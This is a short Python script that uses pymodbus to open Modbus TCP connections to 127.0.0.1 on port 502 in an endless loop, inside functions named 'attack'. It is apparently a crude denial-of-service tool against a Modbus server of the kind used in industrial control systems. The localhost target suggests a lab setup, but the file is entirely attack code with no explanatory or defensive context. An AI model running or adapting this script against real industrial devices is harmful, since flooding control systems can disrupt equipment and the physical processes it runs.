import asyncio
import pymodbus.client as modbusClient
port = 502
ip = "127.0.0.1"

def clientsetup(port,ip):
    client = modbusClient.AsyncModbusTcpClient(host=ip, port=port)
    return client

async def attack(client):
    while True:
        await client.connect()


async def attackrun(port,ip):
    client = clientsetup(port,ip)
    await attack(client)

if __name__ == "__main__":
    asyncio.run(attackrun(port,ip))
